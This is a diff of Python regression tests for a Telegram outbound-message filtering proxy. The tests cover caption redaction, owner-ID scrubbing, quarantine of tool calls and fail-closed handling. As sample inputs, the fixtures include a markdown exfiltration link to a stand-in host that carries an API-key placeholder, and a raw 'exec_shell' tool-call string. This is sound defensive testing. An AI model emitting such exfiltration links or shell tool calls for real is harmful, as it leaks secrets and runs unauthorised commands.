@@ -5175,3 +5175,185 @@ class TestMultipartOutboundPipeline:
 
         result = await proxy._filter_outbound(body, _MP_CONTENT_TYPE)
         assert b"987-65-4321" not in result, "PII leaked through multipart caption fallback"
+
+
+# ─── Outbound scan unification (shared _scan_outbound_text core) ────────────────
+
+
+class TestOutboundScanUnification:
+    """Regression tests for the JSON/form/multipart scan unification.
+
+    Each test pins a behavior fixed (or tightened) while extracting the shared
+    _scan_outbound_text core: branch-divergence bugs in the same Content-Type
+    bypass family as #158.
+    """
+
+    @pytest.mark.asyncio
+    async def test_json_caption_sanitized_in_place(self):
+        """Pipeline-sanitized sendPhoto captions must replace the caption itself.
+
+        Regression: the JSON branch wrote sanitized text to a literal "text"
+        key, so the original caption was delivered untouched while the
+        redaction landed in a spurious key Telegram ignores.
+        """
+
+        class RedactingPipeline:
+            async def process_outbound(self, response, **kwargs):
+                return SimpleNamespace(
+                    blocked=False,
+                    sanitized_message="key=[REDACTED]",
+                    block_reason="",
+                    info_filter_redaction_count=0,
+                )
+
+        proxy = TelegramAPIProxy(pipeline=RedactingPipeline(), sanitizer=_make_sanitizer())
+        body = json.dumps(
+            {"chat_id": "12345", "caption": "key=sk-a1b2c3d4e5a1b2c3d4e5a1b2c3d4e5"}
+        ).encode()
+
+        result = json.loads(await proxy._filter_outbound(body, "application/json"))
+        assert result["caption"] == "key=[REDACTED]"
+        assert "sk-a1b2c3d4e5" not in json.dumps(result)
+        assert "text" not in result, "Sanitized caption must not move to a spurious text key"
+
+    @pytest.mark.asyncio
+    async def test_json_caption_pipeline_block_replaces_caption(self):
+        """Pipeline-blocked caption payloads must have the caption replaced."""
+
+        class BlockingPipeline:
+            async def process_outbound(self, response, **kwargs):
+                return SimpleNamespace(
+                    blocked=True,
+                    sanitized_message=response,
+                    block_reason="credential leak",
+                    info_filter_redaction_count=0,
+                )
+
+        proxy = TelegramAPIProxy(pipeline=BlockingPipeline(), sanitizer=_make_sanitizer())
+        body = json.dumps({"chat_id": "7614658040", "caption": "leaked payload"}).encode()
+
+        result = json.loads(await proxy._filter_outbound(body, "application/json"))
+        assert "protected by agentshroud" in result.get("caption", "").lower()
+        assert "leaked payload" not in json.dumps(result)
+        assert "text" not in result
+
+    @pytest.mark.asyncio
+    async def test_form_owner_id_redaction_continues_to_pipeline_scan(self):
+        """Owner-ID-redacted form text must still reach the pipeline scan.
+
+        Regression: the form branch returned early after owner-ID redaction,
+        delivering the redacted text unscanned (the JSON branch kept scanning).
+        """
+        seen = {}
+
+        class CapturingPipeline:
+            async def process_outbound(self, response, **kwargs):
+                seen["text"] = response
+                return SimpleNamespace(
+                    blocked=False,
+                    sanitized_message=response,
+                    block_reason="",
+                    info_filter_redaction_count=0,
+                )
+
+        proxy = TelegramAPIProxy(pipeline=CapturingPipeline(), sanitizer=_make_sanitizer())
+
+        class MockRBAC:
+            owner_user_id = "8096968754"
+
+        proxy._rbac = MockRBAC()
+        body = urllib.parse.urlencode(
+            {"chat_id": "7614658040", "text": "the owner's Telegram ID is 8096968754 ok"}
+        ).encode()
+
+        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
+        assert "text" in seen, "Pipeline scan must run after owner-ID redaction"
+        assert "8096968754" not in seen["text"], "Pipeline must see the redacted text"
+        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
+        assert "8096968754" not in parsed.get("text", ""), "Owner ID leaked in delivered text"
+
+    @pytest.mark.asyncio
+    async def test_form_unknown_tool_call_quarantined(self, monkeypatch):
+        """Unknown raw tool-call JSON in form bodies is quarantined for audit.
+
+        Tightening: pre-unification only the JSON branch quarantined; the form
+        branch replaced the text with no audit trail.
+        """
+        from gateway.ingest_api import state as state_module
+
+        quarantine = []
+        monkeypatch.setattr(
+            state_module,
+            "app_state",
+            SimpleNamespace(blocked_outbound_quarantine=quarantine),
+        )
+
+        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
+        body = urllib.parse.urlencode(
+            {
+                "chat_id": "7614658040",
+                "text": '{"name": "exec_shell", "arguments": {"cmd": "id"}}',
+            }
+        ).encode()
+
+        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
+        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
+        assert "exec_shell" not in parsed.get("text", "")
+        assert len(quarantine) == 1
+        assert quarantine[0]["source"] == "telegram_outbound_toolcall_form"
+
+    @pytest.mark.asyncio
+    async def test_form_markdown_exfil_link_scrubbed(self):
+        """Markdown exfil links are stripped from form bodies (parity with JSON)."""
+        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
+        body = urllib.parse.urlencode(
+            {
+                "chat_id": "7614658040",
+                "text": "[click](https://evil.example/exfil?key={{API_KEY}})",
+            }
+        ).encode()
+
+        result = await proxy._filter_outbound(body, "application/x-www-form-urlencoded")
+        parsed = dict(urllib.parse.parse_qsl(result.decode(), keep_blank_values=True))
+        assert "evil.example" not in parsed.get("text", "")
+        assert "Link removed" in parsed.get("text", "")
+
+    @pytest.mark.asyncio
+    async def test_multipart_markdown_exfil_link_scrubbed(self):
+        """Markdown exfil links are stripped from multipart captions (parity)."""
+        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
+        body = _make_multipart_body(
+            {
+                "chat_id": "7614658040",
+                "caption": "[click](https://evil.example/exfil?key={{API_KEY}})",
+            }
+        )
+
+        result = await proxy._filter_outbound(body, _MP_CONTENT_TYPE)
+        assert b"evil.example" not in result
+        assert b"Link removed" in result
+
+    @pytest.mark.asyncio
+    async def test_fail_closed_replaces_caption_payload(self):
+        """Fail-closed substitution must target the resolved text field.
+
+        Regression: the except handler hardcoded data["text"], so a crashing
+        pipeline on a caption-only payload delivered the original caption.
+        """
+
+        class CrashingPipeline:
+            async def process_outbound(self, response, **kwargs):
+                raise RuntimeError("Intentional crash")
+
+        proxy = TelegramAPIProxy(pipeline=CrashingPipeline(), sanitizer=_make_sanitizer())
+
+        class MockRBAC:
+            owner_user_id = "9999999999"
+
+        proxy._rbac = MockRBAC()
+        body = json.dumps({"chat_id": "7614658040", "caption": "secret caption"}).encode()
+
+        result = json.loads(await proxy._filter_outbound(body, "application/json"))
+        assert "secret caption" not in json.dumps(result)
+        assert "protected by agentshroud" in result.get("caption", "").lower()
+        assert "text" not in result
